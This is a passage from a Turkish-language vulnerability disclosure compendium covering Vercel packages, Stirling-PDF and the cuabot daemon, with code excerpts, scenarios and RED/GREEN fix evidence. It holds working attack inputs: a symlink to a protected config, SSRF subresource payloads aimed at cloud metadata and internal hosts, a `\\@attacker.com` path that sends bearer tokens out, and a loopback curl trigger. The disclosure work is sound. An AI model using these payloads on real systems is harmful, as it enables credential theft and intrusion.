flight_uxss: true`<br/>`GREEN`: `redirect: 'manual', external_hop_followed: false`<br/>HackerOne `#4152250` (+2 Comments) |
| **40** | [`40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/tr/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)<br/>`VERCEL-NEXT-09`<br/>MITRE CNA-LR & HackerOne #4152265 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/image-optimizer.ts:696-729`<br/>`packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`) | `CWE-918 / CWE-863`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `fetchExternalImage()` (`image-optimizer.js:586-615`), `remotePatterns` kontrolünü `3xx` yönlendirmelerinde tekrarlamaz (`09A`). `isPrivateIp(ip)` fonksiyonu Linux tireli IPv6 zone indekslerinde (`::ffff:127.0.0.1%br-...`) fail-open (`return false`) yapar ve `::7f00:1` ile `64:ff9b:1::/48` adreslerini `unicast` sayar (`09B`).<br/>**Senaryo A (Aynı Sunucu Dizin Atlaması):** `/public-avatars/**` üzerinden `/private-kyc-docs/passport-scan.png` okunur.<br/>**Senaryo B (Farklı Sunucu İzin Listesi Atlaması):** İzinli CDN'den iç sunucuya sıçranır.<br/>**Senaryo C (`09A -> 09B` Doğrudan `127.0.0.1` Loopback SSRF):** `::ffff:127.0.0.1%br-...` üzerinden `127.0.0.1` soketine bağlanılır. | `RED`: `remotePatterns_bypassed: true, loopback_server_hit: true, remote_addr: ::ffff:127.0.0.1`<br/>`GREEN`: `redirect_rechecked: true, fail_closed: true`<br/>HackerOne `#4152265` (+2 Comments) |
| **41** | [`41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)<br/>`VERCEL-CLI-07`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`vercel <= 65.4.0`)<br/>`packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`<br/>`packages/cli/src/commands/http-cli/index.ts` | `CWE-200 / CWE-436`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `constructFullUrl()` (`packages/cli/src/commands/curl/utils.ts:179-216`), `new URL()` ile köken kontrolü yapıp ham `${baseUrl}${normalizedPath}` dizgesini döndürür. `\\@attacker.com` girdisinde `libcurl`, `baseUrl\\` kısmını kullanıcı adı, `attacker.com`'u hedef sunucu olarak ayrıştırır.<br/>**Senaryo A (CI/CD Sır Sızıntısı):** `vercel curl`, `Authorization: Bearer` ve `x-vercel-protection-bypass` başlıklarını dış sunucuya gönderir.<br/>**Senaryo B (Geliştirici/Ajan CLI Sızıntısı):** Zararlı yol parametresi canlı CLI anahtarını çalar.<br/>**Senaryo C (Otomatik Üretilen Bypass Sırrı):** `PATCH /v10/projects/{id}/protection-bypass` ile üretilen sır dışarı sızar. | `RED`: `whatwg_origin_check_passed: true, curl_connected_to_attacker: true, leaked_bearer: true`<br/>`GREEN`: `rejected_backslash_and_globoff: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **42** | [`42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/tr/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)<br/>`VERCEL-FLAGS-CORE-06`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`@vercel/flags-core <= 1.10.2`)<br/>`packages/flags-core/src/controller.ts:555-615`<br/>`packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`) | `CWE-400 / CWE-345`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **Kodda Oluşumu:** `Controller.streamResponse()` (`controller.ts:555-615`), `res.ok` ve veri dosyası gövdesini doğrulamadan `x-datafile-Updated-At` başlığıyla `datafileUpdatedAtWatermark` değerini günceller.<br/>**Senaryo A (Kill-Switch Kilidi):** `9999999999999` değeri tüm yeni bayrak güncellemelerinin reddedilmesine yol açar.<br/>**Senaryo B (`redirect: 'manual'` Eksikliği):** Akış isteği `3xx` yönlendirmelerini takip eder.<br/>**Senaryo C (Kalıcı Durum Donması):** Sunucu yeniden başlatılana kadar eski bayrakta kalır. | `RED`: `poisoned_watermark: 9999999999999, bundled_update_ignored: true`<br/>`GREEN`: `requires_res_ok_and_bounded_skew: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **43** | [`43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/tr/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)<br/>`VERCEL-FLAGS-05`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`flags <= 4.4.0`)<br/>`packages/flags/src/next/precompute.ts:206-214`<br/>`packages/flags/dist/next/index.js:119-125` (`deserialize`) | `CWE-347`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` | **Kodda Oluşumu:** `deserialize(flags, code, secret)` (`precompute.ts:206-214`), `flags.length > 0` olsa bile `code === '__no_flags__'` olduğunda JWS imzasını doğrulamadan `{}` döndürür.<br/>**Scenario A (Edge Kısıtlama Atlaması):** `/__no_flags__/page` isteği JWS kontrolünü atlar ve `flag.decide()` geri dönüşünü tetikler.<br/>**Senaryo B (Kohort Sıfırlama):** İmza anahtarı bilinmeden imzalı kohort sıfırlanır.<br/>**Senaryo C (Sunucu Yükü):** Her istekte `decide()` yeniden çalıştırılır. | `RED`: `deserialize('__no_flags__'): {}, getPrecomputed_bypassed_edge_false_to_true: true`<br/>`GREEN`: `requires_flags_length_zero_for_sentinel: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **44** | [`44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/tr/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)<br/>`VERCEL-FIREWALL-01`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/firewall** (`@vercel/firewall <= 1.2.6`)<br/>`packages/firewall/src/rate-limit.ts:138-183, 211-285`<br/>`cmd/ipc-proxy/client.go:34-41, 79-97` | `CWE-918 / CWE-200 / CWE-636`<br/>**7.2 High**<br/>`AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N` | **Kodda Oluşumu:** `resolveFirewallHost()` (`rate-limit.ts:138-167`), `VERCEL_ENV !== 'production'` iken gelen `Host` başlığına `x-vercel-rate-limit-secret` ve `x-vercel-oidc-token` gönderir; hata durumunda `{ rateLimited: false }` ile fail-open yapar.<br/>**Senaryo A (Sır Sızıntısı):** Sahte `Host` başlığı `VF_RATE_LIMIT_SECRET` anahtarını çalar.<br/>**Senaryo B (Fail-Open Hız Sınırı Atlama):** Hatalı `Host` ile `{ rateLimited: false }` alınarak OTP/parola sınırı aşılır.<br/>**Senaryo C (Go `ipc-proxy` `%s` Hatası):** `client.go:38` içinde `fmt.Sprintf` eksikliği. | `RED`: `leaked_rate_limit_secret: rl_secret_LIVE_99887766, fail_open_rateLimited: false`<br/>`GREEN`: `strict_hostname_regex_and_sprintf_fixed: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **45** | [`45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/tr/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)<br/>`VERCEL-CLIENT-08A`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/hashes.ts:115-167`<br/>`packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`) | `CWE-200 / CWE-706`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`), `.vc-config.json` `filePathMap` girdilerini kök dizin veya `.vercelignore` kontrolü yapmadan `path.resolve(cwd, filePath)` ile okur ve yükler.<br/>**Senaryo A (`.next/required-server-files.json` Sızıntısı):** `.vercelignore`'a rağmen yerel `.env` sırları yüklenir.<br/>**Senaryo B (CI Prebuilt Traversal):** `filePathMap` içindeki `../../` yolları konak dosyalarını `/v2/files`'a yükler.<br/>**Senaryo C (Önbellek Zehirlemesi):** `.vc-config.json` ile runner sırları sızdırılır. | `RED`: `outside_host_secret_uploaded: true, dotnext_env_secret_uploaded: true`<br/>`GREEN`: `path_confined_to_cwd: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **46** | [`46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/tr/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)<br/>`VERCEL-CLIENT-08B`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/index.ts:116-148`<br/>`packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`) | `CWE-59 / CWE-200`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **Kodda Oluşumu:** `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`), `config.bulkRedirectsPath` dizinini `fs.realpath()` sınır kontrolü ve `.vercelignore` filtresi olmadan tarar; sembolik bağları takip eder.<br/>**Senaryo A (Symlink Kaçışı):** Sembolik bağ ile proje dışı konak dosyaları dağıtıma yüklenir.<br/>**Senaryo B (`../` Dizin Tarama):** Üst dizin yolu ile dış klasörler yüklenir.<br/>**Senaryo C (`.vercelignore` Atlaması):** Hariç tutulan sır dosyaları yüklenir. | `RED`: `symlink_target_outside_cwd_uploaded: true`<br/>`GREEN`: `realpath_confinement_and_lstat_enforced: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — İzlenen Klasör (`Watched Folder`) Sembolik Bağ (`Symlink`) Kaçışı ile `FolderAccessGuard` Atlama (`GHSA-hpc7-xx5r-gc44`, `CWE-59`/`CWE-61`, CVSS `7.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **Etkilenen Sürüm & Bileşenler:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `FolderInputSource.java` (`listFiles`, satır `337-377`), `ProcessingFolderController.java` (satır `374-380`), `FolderOutputSink.java` (`archiveOriginal`, satır `338-345`)
* **Zafiyet Sınıfı & Skor:** `CWE-59` (Dosya Erişiminden Önce Uygunsuz Bağ Çözümlemesi) / `CWE-61` (UNIX Sembolik Bağ Takibi) — **CVSS v3.1: `7.1 High`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-hpc7-xx5r-gc44` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/01-STIRLING-CAND-02-SYMLINK.md`](advisories/tr/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Stirling-PDF'in **Otomatik İşlenen Klasör (Watched Folder)** özelliği, şirketlerde ağ üzerindeki ortak bir klasöre (örneğin `/mnt/scanner-incoming`) bırakılan belgeleri otomatik olarak okuyup işleyerek çıktı klasörüne (`/mnt/scanner-processed`) kaydetmek için kullanılır. Geliştiriciler, bu özelliğin sunucunun kendi gizli ayar dosyalarını (`/configs/settings.yml` vb.) okumaması için `FolderAccessGuard.isProtected(path)` adında bir güvenlik bekçisi yazmıştır.

Ancak Java'nın standart dosya kontrol fonksiyonu olan `Files.isRegularFile(path)` çok kritik bir davranışa sahiptir: **Eğer ikinci parametre olarak `LinkOption.NOFOLLOW_LINKS` verilmezse, sembolik bağları (kısayolları / symlink) otomatik olarak takip eder** ve hedefteki dosya normal bir dosyaysa `true` döner! Buna karşılık `FolderAccessGuard.isProtected(path)` yalnızca dosyanın görünürdeki metinsel yoluna (`path.toAbsolutePath().normalize()`) bakar, gerçek hedefine (`toRealPath()`) bakmaz.

`FolderInputSource.java:337-350` içindeki zafiyetli kod tam olarak şöyledir:
```java
// app/proprietary/src/main/java/stirling/software/proprietary/policy/input/FolderInputSource.java:337-350
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // Varsayılan mod (recursive = false)
        try (Stream<Path> entries = Files.list(inputDir)) {
            entries.filter(Files::isRegularFile) // HATA 1: LinkOption.NOFOLLOW_LINKS yok! Symlink'i takip eder.
                    .filter(file -> !hidden(file))
                    // HATA 2: accessGuard.isProtected(file) ve kanonik kök kontrolü burada hiç çağrılmıyor!
                    .forEach(files::add);
        }
        return files;
    }
```
Üstelik dosya işlendikten sonra çalışan `FolderOutputSink.archiveOriginal()` (`FolderOutputSink.java:338-345`) metodu da sembolik bağın işaret ettiği hedef dosyayı kopyalayıp arşiv klasörüne taşır. Böylece ortak klasöre gerçek bir PDF yerine `invoice.pdf -> /configs/settings.yml` şeklinde bir sembolik bağ bırakan sıradan bir kullanıcı, güvenlik bekçisini tamamen atlatarak sunucunun tüm gizli ayarlarını kendi okuyabileceği çıktı klasörüne kopyalatmış olur.

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kurumsal SMB / NFS Ofis Tarayıcı Klasöründen Yönetici Parolası ve OAuth Sırlarının Çalınması:**
  1. Bir şirket, çalışanların tarayıcıdan çıkan belgeleri otomatik OCR işlemine sokması için `/mnt/scanner-incoming` ağ paylaşımını Stirling-PDF'e varsayılan `recursive=false` modunda bağlar.
  2. Ağ paylaşımına yazma izni olan düşük yetkili bir kullanıcı veya iç ağa sızmış bir saldırgan, paylaşıma `ln -s /configs/settings.yml /mnt/scanner-incoming/fatura.pdf` sembolik bağını bırakır.
  3. Arka plan tarayıcısı `Files.isRegularFile` kontrolünden geçen bu sembolik bağı okur ve içinde `SECURITY_INITIALADMINPASSWORD`, OAuth2 `clientSecret` ve SMTP parolalarının bulunduğu `settings.yml` dosyasını herkesin okuyabildiği `/mnt/scanner-processed` çıktı klasörüne kaydeder.
* **Senaryo B — Otomatik SFTP / Nextcloud Belge Aktarım Hattında Konak SSH Anahtarlarının veya `.env` Dosyasının Arşivlenmesi:**
  1. Bir hukuk bürosu veya hastane, dış iş ortaklarından SFTP/Nextcloud ile gelen belge klasörünü Stirling-PDF'in izlenen klasörüne bağlar.
  2. Gönderilen arşiv içindeki bir sembolik bağ `/home/community-user/.ssh/id_ed25519` veya `/app/configs/custom_settings.yml` dosyasını işaret eder.
  3. `FolderOutputSink.archiveOriginal()` (`FolderOutputSink.java:338-345`) hedef dosyayı `NOFOLLOW_LINKS` olmadan kopyaladığı/taşıdığı için sunucunun özel anahtarı doğrudan dışa açık işlenmiş belgeler klasörüne düşer.
* **Senaryo C — Çok Kiracılı (Multi-Tenant) Departman Klasörleri Arasında İzolasyonun Kırılması ve `recursive=false` Yanılsaması:**
  1. Sistem yöneticisi, alt klasörlere inilmemesi ve güvenliğin sıkı olması için özellikle varsayılan `recursive: false` ayarını seçer.
  2. Oysa `recursive: true` modu `Files.walkFileTree` kullandığı için varsayılan olarak sembolik bağları takip etmezken, "daha güvenli" sanılan `recursive: false` modu `Files::isRegularFile` yüzünden sembolik bağları takip eder ve A departmanının B departmanına ait özel klasördeki sözleşmeleri kendi çıktı klasörüne çekmesine imkan tanır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. İzole yerel test ortamında sembolik bağ kaçışını (RED) ve yamalı davranışı (GREEN) doğrulama
python3 - <<'EOF'
import os, tempfile
from pathlib import Path

with tempfile.TemporaryDirectory() as tmp:
    root = Path(tmp)
    watched = root / "watched_in"
    protected = root / "protected_configs"
    watched.mkdir(); protected.mkdir()
    secret_file = protected / "settings.yml"
    secret_file.write_text("SECURITY_INITIALADMINPASSWORD: SuperSecretAdmin123\n")
    (watched / "normal.pdf").write_text("%PDF-1.4 benign")
    os.symlink(secret_file, watched / "invoice.pdf")

    # RED (v3.2.2 varsayılan recursive=false davranışı: symlink takip edilir)
    red_files = [p.name for p in watched.iterdir() if p.is_file()]  # follow_symlinks=True
    # GREEN (Yamalı davranış: NOFOLLOW_LINKS + kanonik kök kontrolü)
    green_files = [
        p.name for p in watched.iterdir()
        if p.is_file(follow_symlinks=False) and p.resolve().is_relative_to(watched.resolve())
    ]
    print({"RED_ingested": sorted(red_files), "GREEN_ingested": sorted(green_files)})
EOF

# 2. Sniper üzerinde Stirling-PDF proje denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/Stirling-PDF" \
  --output-json "$HOME/audit-targets/reports/stirling-pdf-audit.json"
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "STIRLING-CAND-02": {
    "ghsa_id": "GHSA-hpc7-xx5r-gc44",
    "RED": {
      "recursive": false,
      "symlink_accepted": true,
      "protected_settings_exfiltrated": true,
      "processed_files_count": 2,
      "exfiltrated_artifact": "processed_output/report_processed.txt"
    },
    "GREEN": {
      "recursive": false,
      "symlink_accepted": false,
      "protected_settings_exfiltrated": false,
      "regular_file_processed": true,
      "processed_files_count": 1
    }
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — `CVE-2026-71270` Eksik Yaması: `ConvertWebsiteToPDF.java` (`/api/v1/convert/url/pdf`) Üzerinden WeasyPrint Alt-Kaynak SSRF ve İç Ağ Verisi Sızıntısı (`GHSA-ff6j-8xch-j8r6`, `CWE-918`, CVSS `8.6 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **Etkilenen Sürüm & Bileşenler:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `ConvertWebsiteToPDF.java` (`urlToPdf`, satır `116-143`, `POST /api/v1/convert/url/pdf`)
* **Zafiyet Sınıfı & Skor:** `CWE-918` (Sunucu Taraflı İstek Sahteciliği — SSRF / `CVE-2026-71270` Eksik Yaması) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-ff6j-8xch-j8r6` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `GHSA-j5rg-wh78-9f2q` / `CVE-2026-71270` varyantı)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Stirling-PDF'te daha önce HTML dosyalarını PDF'e çeviren `FileToPdf.java` bileşeninde WeasyPrint aracının iç ağdaki adreslere (`127.0.0.1`, `169.254.169.254`) bağlanabildiği bir SSRF açığı (`CVE-2026-71270`) bulunmuş ve geliştiriciler `FileToPdf.java:63-91` dosyasında HTML içeriğini `customHtmlSanitizer.sanitize()` ile temizleyip WeasyPrint'e `--allowed-protocols data` (yani HTTP/HTTPS tamamen yasak!) parametresi vererek o noktayı kapatmıştı.

**Ancak** aynı depodaki kardeş uç nokta olan `POST /api/v1/convert/url/pdf` (`ConvertWebsiteToPDF.java:116-143`) unutulmuştur! Bu uç nokta çalışma zamanında şu iki hatayı aynı anda yapar:
1. Kullanıcının verdiği dış URL'nin ana HTML metnini `fetchRemoteHtml(URL)` ile indirir ama **üzerinde `customHtmlSanitizer.sanitize()` çağırmaz**.
2. İndirdiği HTML'i PDF'e basması için WeasyPrint alt sürecini başlatırken `--allowed-protocols data,http,https` bayrağını verir!

```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:115-142
String htmlContent = fetchRemoteHtml(URL); // HATA 1: customHtmlSanitizer.sanitize() çağrılmıyor!
...
List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // HATA 2: WeasyPrint'in kendi başına http/https isteği atmasına izin veriliyor!
```
Bunun sonucunda saldırgan tamamen yasal görünen bir dış web sayfası (`https://ornek-site.com/fatura.html`) verir. Java katmanı `ornek-site.com` adresinin genel internette olduğunu görüp onaylar. Fakat o HTML sayfasının içinde `<link rel="stylesheet" href="http://127.0.0.1:8080/internal-secrets.css">` veya `<img src="http://169.254.169.254/latest/meta-data/...">` etiketi vardır. WeasyPrint ayrı bir Python süreci olarak çalıştığı için Java'nın `SsrfProtectionService` korumasından hiç geçmeden doğrudan `127.0.0.1` veya iç ağdaki sunuculara bağlanır ve aldığı yanıtı üretilen PDF sayfasının içine yazar!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Fatura / Makbuz URL-to-PDF Servisinden Bulut IAM Kimlik Bilgilerinin (`169.254.169.254`) ve İç Servislerin Sızdırılması:**
  1. Bir şirket, müşterilerin veya muhasebe personelinin web üzerindeki e-makbuz bağlantılarını PDF olarak indirebilmesi için Stirling-PDF'in `/api/v1/convert/url/pdf` uç noktasını kendi uygulamasına bağlar.
  2. Saldırgan kendi kontrolündeki bir dış URL'yi gönderir; sayfanın içindeki CSS `@import` ve `<link>` etiketleri `http://127.0.0.1:8080/actuator/env` veya bulut meta veri servisini (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) hedefler.
  3. WeasyPrint bu iç kaynakları çekip stil/içerik olarak işler ve saldırgan indirdiği PDF dosyasının içinden sunucunun iç ağ sırlarını okur.
* **Senaryo B — Java `SsrfProtectionService` DNS/IP Filtresinin WeasyPrint Alt Süreci Üzerinden Tamamen Atlanması:**
  1. Sistem yöneticisi Stirling-PDF'in SSRF korumasını aktif tutar ve doğrudan `url=http://127.0.0.1/...` isteklerinin Java katmanında engellendiğini görerek güvende olduğunu düşünür.
  2. Ancak saldırgan `url=https://dis-site.example/sayfa.html` gönderdiğinde, sayfa içindeki `@import url("http://10.0.0.12:9090/metrics")` alt istekleri Java'dan değil doğrudan WeasyPrint Python sürecinden çıktığı için iç Kubernetes/Docker ağı engelsiz taranır.
* **Senaryo C — Kardeş Uç Noktalar (`ConvertHtmlToPDF` vs `ConvertWebsiteToPDF`) Arasındaki Yama Tutarsızlığı Nedeniyle Yanlış Güven:**
  1. Güvenlik denetçileri `v3.2.2` sürüm notlarında `CVE-2026-71270` (`GHSA-j5rg-wh78-9f2q`) açığının kapatıldığını görür ve `FileToPdf.java` içindeki `--allowed-protocols data` kısıtlamasını doğrular.
  2. Ancak `/api/v1/convert/url/pdf` uç noktası aynı WeasyPrint ikilisini `--allowed-protocols data,http,https` ile çağırmaya devam ettiği için üretim ortamı aynı SSRF vektörüne açık kalır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. ConvertWebsiteToPDF.java ile FileToPdf.java arasındaki --allowed-protocols farkını kaynak kodda doğrulama
grep -rn -C 4 "allowed-protocols" "$HOME/audit-targets/Stirling-PDF/app/"

# 2. Yerel loopback (127.0.0.1) üzerinde izole SSRF alt-kaynak testini çalıştırma
curl -sS -X POST "http://127.0.0.1:8080/api/v1/convert/url/pdf" \
  -F "url=http://127.0.0.1:18081/public_landing.html" \
  -o /tmp/stirling_url_out.pdf
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "STIRLING-CAND-01": {
    "ghsa_id": "GHSA-ff6j-8xch-j8r6",
    "upstream_cve_duplicate_status": "Incomplete Fix / Variant of CVE-2026-71270 / GHSA-j5rg-wh78-9f2q in v3.2.2",
    "RED": {
      "weasyprint_allowed_protocols": "data,http,https",
      "internal_subresource_fetched": true,
      "internal_data_embedded_in_pdf": true,
      "internal_loopback_hit_count": 1
    },
    "GREEN": {
      "weasyprint_allowed_protocols": "data",
      "internal_subresource_fetched": false,
      "internal_data_embedded_in_pdf": false,
      "internal_loopback_hit_count": 0
    }
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — Kimlik Doğrulamasız `0.0.0.0:7842` `cuabotd` Servisi, Wildcard CORS (`*`) `POST /bash`, Origin Kontrolsüz WebSocket (`CSWSH`) ve Yazılabilir `.claude` Bağlaması Üzerinden Uzaktan Komut Çalıştırma (`GHSA-cp36-x5hg-3gg8`, `CWE-306`/`CWE-942`, CVSS `9.6 Critical`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`npm: cuabot <= 1.0.16`)
* **Etkilenen Sürüm & Bileşenler:** `>= 1.0.1, <= 1.0.16` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cuabot/src/cuabotd.ts` (satır `34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120`)
* **Zafiyet Sınıfı & Skor:** `CWE-306` (Kritik Fonksiyon İçin Eksik Kimlik Doğrulaması) / `CWE-942` (Aşırı İzin Verici Çapraz Alan Adı Politikası) — **CVSS v3.1: `9.6 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-cp36-x5hg-3gg8` (`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Normalde bilgisayarınızda çalışan yerel bir servisin internetteki rastgele web siteleri tarafından kullanılmasını tarayıcıların **Aynı Köken Politikası (Same-Origin Policy / CORS)** engeller. Bir web sayfası `http://localhost:7842/bash` adresine `Content-Type: application/json` ile `POST` isteği atmak istediğinde, tarayıcı önce sunucuya bir `OPTIONS` (preflight) sorusu gönderir: *"Bu yabancı web sitesinin sana JSON komutu göndermesine ve cevabı okumasına izin veriyor musun?"*

`cuabotd.ts` içindeki kod, bu güvenlik duvarını kendi elleriyle yıkan **dört hatayı aynı anda** yapmaktadır:
1. **Kimlik doğrulaması yoktur** ve `Access-Control-Allow-Origin: *` ile `OPTIONS` isteklerine `200 OK` döner (`cuabotd.ts:969-977`).
2. `POST /bash` uç noktası gelen JSON içindeki `command` dizgisini doğrudan çalıştırıp `stdout` çıktısını yanıt olarak döner (`cuabotd.ts:996-1002`).
3. WebSocket PTY terminali (`ws://localhost:7842/?command=...`) hiçbir `Origin` kontrolü yapmadan etkileşimli kabuk açar (`cuabotd.ts:1018-1063`).
4. Sunucu başlatılırken `server.listen(port)` (`cuabotd.ts:1120`) içinde `'127.0.0.1'` belirtilmediği için `0.0.0.0:7842` (tüm Wi-Fi/LAN ağ arayüzleri) üzerinde dinler ve geliştiricinin konak `~/.cuabot/user/.claude` klasörünü yazılabilir (`-v ${claudeConfigPath}:/home/community-user/.claude`) olarak bağlar!

```typescript
// libs/cuabot/src/cuabotd.ts:967-1002 & 1120
res.setHeader('Content-Type', 'application/json');
res.setHeader('Access-Control-Allow-Origin', '*'); // HATA 1: Tüm yabancı web sitelerine tam okuma/yazma izni!
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

if (req.method === 'OPTIONS') {
  res.writeHead(200); // HATA 2: Tarayıcı preflight kontrolünü koşulsuz onaylar!
  res.end();
  return;
}
...
if (path === 'bash' && req.method === 'POST') {
  const { command, timeout } = JSON.parse(body); // HATA 3: Hiçbir token/parola kontrolü yok!
  const result = await bash(command, timeout);
  res.end(JSON.stringify(result));
  return;
}
...
server.listen(port, () => { // HATA 4: '127.0.0.1' yok -> 0.0.0.0:7842 tüm yerel ağa açık!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
